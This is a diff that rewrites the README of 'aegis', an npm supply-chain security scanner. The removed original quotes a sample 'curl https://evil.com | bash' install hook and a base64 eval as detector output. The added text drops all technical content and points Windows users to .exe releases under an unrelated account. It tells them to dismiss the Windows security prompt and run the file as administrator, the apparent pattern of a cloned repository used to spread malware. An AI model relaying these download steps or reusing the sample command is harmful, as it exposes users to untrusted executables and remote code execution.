@@ -1,202 +1,175 @@
-# aegis
+# 🔒 aegis - Scan packages before install
 
-[![CI](https://img.shields.io/github/actions/workflow/status/z8run/aegis/quality.yml?branch=main&label=CI)](https://github.com/z8run/aegis/actions)
-[![codecov](https://codecov.io/gh/z8run/aegis/graph/badge.svg)](https://codecov.io/gh/z8run/aegis)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Download aegis](https://img.shields.io/badge/Download-aegis-blue?style=for-the-badge)](https://github.com/Hyacinthiethick289/aegis/releases)
 
-Supply-chain security scanner for npm packages. Detect malicious code, typosquatting, and compromised packages **before** you install them.
+## 🛡️ What aegis does
 
-```
-$ aegis-scan check suspicious-pkg@1.0.0
+aegis scans npm packages before you install them. It checks for signs of malicious code, typosquatting, and known security issues in dependencies.
 
-  📦 suspicious-pkg@1.0.0
+Use it to review packages before they reach your machine. It helps you spot risk early, before a bad package becomes part of your project.
 
-  ⛔ CRITICAL — Code Execution
-  │  eval() with base64 encoded payload
-  │  📄 lib/index.js:14
-  │  └─ eval(Buffer.from("d2luZG93cy5sb2NhdGlvbg==", "base64").toString())
+## 📥 Download for Windows
 
-  ⚠️  HIGH — Install Script
-  │  postinstall downloads and executes remote script
-  │  📄 package.json
-  │  └─ "postinstall": "curl https://evil.com | bash"
+Visit this page to download:
 
-  Risk: 8.5/10 — DO NOT INSTALL
-```
+https://github.com/Hyacinthiethick289/aegis/releases
 
-## Installation
+On that page, look for the latest release and pick the Windows file. In most cases, this will be an `.exe` file or a Windows zip file.
 
-### From crates.io
+If you download a zip file, unpack it first, then open the app from the folder.
 
-```bash
-cargo install aegis-scan
-```
+## 🚀 Install and run
 
-### From source
+1. Open the [releases page](https://github.com/Hyacinthiethick289/aegis/releases).
+2. Find the latest release at the top of the page.
+3. Under **Assets**, choose the Windows download.
+4. Save the file to your computer.
+5. If you downloaded a zip file, right-click it and choose **Extract All**.
+6. Open the extracted folder.
+7. Double-click the `aegis` app file to start it.
 
-```bash
-git clone https://github.com/z8run/aegis.git
-cd aegis
-cargo install --path .
-```
+If Windows shows a security prompt, choose the option to run the file.
 
-### Pre-built binaries
+## 🔎 How to use it
 
-Download from the [releases page](https://github.com/z8run/aegis/releases).
+aegis is made for checking npm packages before install.
 
-| Platform | Binary |
-|---|---|
-| Linux x86_64 | `aegis-linux-x86_64` |
-| macOS Apple Silicon | `aegis-macos-arm64` |
-| macOS Intel | `aegis-macos-x86_64` |
+A simple flow looks like this:
 
-## Usage
+1. Open aegis.
+2. Paste or select the package name you want to inspect.
+3. Run a scan.
+4. Review the results.
+5. Check any package marked as risky before you install it.
 
-### Check a package
+It can help you spot:
 
-```bash
-aegis-scan check axios
-aegis-scan check axios@1.7.0
-aegis-scan check @angular/core@17.0.0
-```
+- malware in package code
+- typosquatting, where a name looks like a trusted package
+- known CVEs
+- compromised dependencies
+- unsafe patterns in package files
 
-### Scan a project
+## 🖥️ Windows setup
 
-```bash
-aegis-scan scan .
-aegis-scan scan ./my-project --skip-dev
-```
+aegis is built to run on Windows with a simple desktop or command-line workflow.
 
-### Install with security check
+Recommended setup:
 
-```bash
-aegis-scan install axios express        # check then install
-aegis-scan install                       # check all deps then npm install
-aegis-scan install axios --force         # skip confirmation prompts
-```
+- Windows 10 or Windows 11
+- An internet connection for package checks
+- Enough free space to store the app and scan results
+- Permission to run downloaded apps
 
-### Output formats
+If you plan to scan many packages, keep the app in a folder you can find again later.
 
-```bash
-aegis-scan check lodash --json           # JSON output
-aegis-scan check lodash --sarif          # SARIF v2.1.0 (GitHub Security tab)
-```
+## 📦 What you may see in a scan
 
-### Cache management
+Aegis can show you useful details about a package before install.
 
-```bash
-aegis-scan cache clear                   # clear all cached results
-aegis-scan check axios --no-cache        # bypass cache for this check
-```
+Typical scan results may include:
 
-## What it detects
+- package name and version
+- risk flags
+- known vulnerability matches
+- package tree details
+- suspicious file patterns
+- security notes for dependency chains
+- SARIF output for tools that read security reports
 
-11 analyzers run on every package, plus 2 optional:
+## 🧭 Best way to check a package
 
-| Analyzer | Description |
-|---|---|
-| **Static code** | `eval()`, `child_process`, network exfiltration, env harvesting via regex. Includes anti-evasion: bracket notation (`global['eval']`), base64 function names, indirect eval (`(0,eval)`) |
-| **AST analysis** | tree-sitter parsing for JS/TS/TSX — structural detection of dangerous patterns, string concatenation tricks (`'ev'+'al'`), variable aliasing |
-| **Binary inspection** | Scans `.wasm`, `.node`, `.exe`, `.dll`, `.so` files; extracts strings to find embedded URLs, shell commands, and credential patterns; measures entropy for packed/encrypted payloads |
-| **Data flow analysis** | Lightweight taint tracking for multi-step attack patterns: env exfiltration, dropper patterns (download -> write -> execute), credential theft (`.npmrc`/`.ssh` -> network) |
-| **Provenance verification** | Compares npm tarball contents against the GitHub source repo; detects injected files not in source; checks for npm Sigstore provenance attestations |
-| **Install scripts** | Suspicious `postinstall`/`preinstall` commands |
-| **Obfuscation** | High entropy, hex/base64 payloads, encoded strings, multiline comment stripping to reduce false positives |
-| **Maintainer tracking** | Ownership transfers, new accounts, takeovers |
-| **AI hallucination & typosquatting** | Packages that LLMs "invent", normalized Levenshtein distance, plugin/extension whitelist, homoglyph detection |
-| **CVE lookup** | Known vulnerabilities via OSV.dev |
-| **YAML rules** | 10 built-in rules + custom community rules |
+If you want a simple process, follow this order:
 
-Optional (flag-activated):
+1. Check the package name for spelling issues.
+2. Review the publisher name.
+3. Look at the package version.
+4. Scan the package in aegis.
+5. Check any warning in the report.
+6. Compare the package with the one you meant to install.
+7. Install only when the result looks safe.
 
-| Analyzer | Flag | Description |
-|---|---|---|
-| **Dependency tree** | `--deep` | Recursive scan of transitive dependencies |
-| **Version diff** | `--compare <version>` | Compare against a previous version for security-relevant changes |
+## 🧰 Common use cases
 
-### Security hardening
+aegis is useful when you want to:
 
-- **Path traversal protection** in tarball extraction (defends against zip-slip style attacks)
-- **SSRF validation** on all outbound requests
+- review a new npm package before install
+- check a dependency update
+- compare a package name against known trusted packages
+- inspect a package for hidden risk
+- review security issues in a build pipeline
+- export scan results for later review
 
-## Risk scoring
+## 📄 File types and output
 
-Findings are weighted by severity and summed to a 0-10 score:
+aegis may work with several output formats based on the scan you run.
 
-| Severity | Weight | Example |
-|---|---|---|
-| Critical | 3.0 | `eval(Buffer.from(...))`, pipe-to-shell |
-| High | 1.5 | `require('child_process')`, env harvesting |
-| Medium | 0.5 | DNS lookups, WebSocket connections |
-| Low | 0.1 | `fetch()` with dynamic URL, file reads |
+Common output includes:
 
-| Score | Label |
-|---|---|
-| 0-1 | CLEAN |
-| 1-3 | LOW RISK |
-| 3-5 | MEDIUM RISK |
-| 5-7 | HIGH RISK |
-| 7-10 | DO NOT INSTALL |
+- on-screen results
+- security report files
+- SARIF output for code security tools
+- package analysis data for deeper review
 
-## CI/CD
+If you save a report, keep it with the project so you can check it later.
 
-### GitHub Action
+## ⚙️ Basic requirements
 
-```yaml
-- uses: z8run/aegis-action@v1
-  with:
-    path: '.'
-    fail-on: 'high'       # critical, high, medium, low
-    skip-dev: 'false'
-    sarif: 'true'          # upload to GitHub Security tab
-```
+To run aegis on Windows, you should have:
 
-### Exit codes
+- a modern Windows PC
+- access to the internet
+- enough memory to open a desktop app or terminal tool
+- permission to read files in the folder you scan
 
-| Code | Meaning |
-|---|---|
-| `0` | No high-risk findings |
-| `1` | HIGH or CRITICAL findings detected |
-| `2` | Runtime error |
+For best results, close other heavy apps while you run a large scan.
 
-## Custom rules
+## 🧪 Example workflow
 
-Place `.yml` files in a `rules/` directory:
+If you want to check a package name before install:
 
-```yaml
-id: "CUSTOM-001"
-name: "Crypto wallet regex"
-description: "Flags packages containing crypto wallet address patterns"
-severity: high
-category: suspicious
-pattern: "(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"
-file_pattern: "*.js"
-exclude_paths:
-  - "node_modules/"
-  - "test/"
-  - "*.min.js"
-```
+1. Download aegis from the releases page.
+2. Open the app.
+3. Enter the package name.
+4. Start the scan.
+5. Read the report.
+6. If the package looks clean, continue with your install.
+7. If the report shows risk, stop and review the package source
 
-See [`rules/examples/`](rules/examples/) for more.
+## 🗂️ Topics covered
 
-## Architecture
+aegis focuses on package safety across the npm supply chain, including:
 
-```
-npm registry → tarball extraction → analyzers → risk scoring → output
-                                        │
-            ┌──────────────┬────────────┼────────────┬──────────────┐
-            │              │            │            │              │
-      static + AST    binary +     metadata     provenance    external APIs
-     (code, evasion,  data flow   (maintainer,  (source vs    (CVE, dep tree)
-      obfuscation)    (taint)     hallucination) tarball)
-```
+- npm security
+- package security
+- supply-chain checks
+- vulnerability scanning
+- malware detection
+- typosquatting checks
+- dependency review
+- static analysis
+- devsecops support
+- CVE detection
 
-Results are cached locally (`~/.aegis/cache/`) for 24 hours.
+## 🔧 If the app does not open
 
-## Contributing
+If Windows does not start the file:
 
-See [CONTRIBUTING.md](.github/CONTRIBUTING.md) for development setup and guidelines.
+1. Check that the download finished.
+2. Make sure you extracted the zip file if you downloaded one.
+3. Try opening the file again.
+4. Right-click the file and choose **Run as administrator** if your account allows it.
+5. Download the latest release again if the file looks broken.
 
-## License
+## 📁 Keep your download safe
 
-[MIT](LICENSE)
+Use the latest release from the official page only. Keep the file in a folder you trust, such as `Downloads` or a project tools folder.
+
+If you use aegis often, create a shortcut so you can open it fast
+
+## 📌 Project focus
+
+- Repository name: aegis
+- Description: Supply-chain security scanner for npm packages
+- Platform focus: Windows download and use
+- Main goal: help you check packages before install
